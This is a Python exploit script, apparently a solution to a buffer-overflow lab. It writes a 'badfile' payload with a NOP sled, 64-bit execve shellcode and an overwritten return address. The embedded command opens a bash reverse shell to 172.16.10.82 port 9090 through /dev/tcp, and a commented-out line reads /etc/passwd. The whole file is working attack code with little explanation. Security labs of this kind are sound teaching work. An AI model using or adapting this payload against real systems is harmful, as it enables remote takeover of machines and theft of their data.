#!/usr/bin/python3
import sys

shellcode = (
    "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
    "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
    "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
    "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
    "/bin/bash*"
    "-c*"
    # You can modify the following command string to run any command.
    # You can even run multiple commands. When you change the string,
    # make sure that the position of the * at the end doesn't change.
    # The code above will change the byte at this position to zero,
    # so the command string ends here.
    # You can delete/add spaces, if needed, to keep the position the same. 
    # The * in this line serves as the position marker:        * 
    #"/bin/ls -l; echo Hello 64; /bin/tail -n 4 /etc/passwd     *"
    "/bin/bash -i > /dev/tcp/172.16.10.82/9090 0<&1 2>&1       *" # Gets a reverse shell
    "AAAAAAAA" # Placeholder for argv[0] --> "/bin/bash"
    "BBBBBBBB" # Placeholder for argv[1] --> "-c"
    "CCCCCCCC" # Placeholder for argv[2] --> the command string
    "DDDDDDDD" # Placeholder for argv[3] --> NULL
).encode('latin-1')

# Fill the content with NOPs
content = bytearray(0x90 for i in range(517)) 

######################################################################
# From server-4 output:
# $rbp = 0x00007fffffffe4f0, &buffer = 0x00007fffffffe4c0
# $rbp - &buffer = 48

# Put the shellcode somewhere in the payload
start = 517 - len(shellcode) # Ensure shellcode goes at end of badfile
content[start:start + len(shellcode)] = shellcode

# Decide the return address value and put it somewhere in the payload
ret = 0x00007fffffffe4f0 + 1200 # $rbp + 1200 (>= +1016 should work)
offset = 56 # $rbp - &buffer + 8

# Use L=4 for 32-bit address and L=8 for 64-bit address
L = 8
content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')
######################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)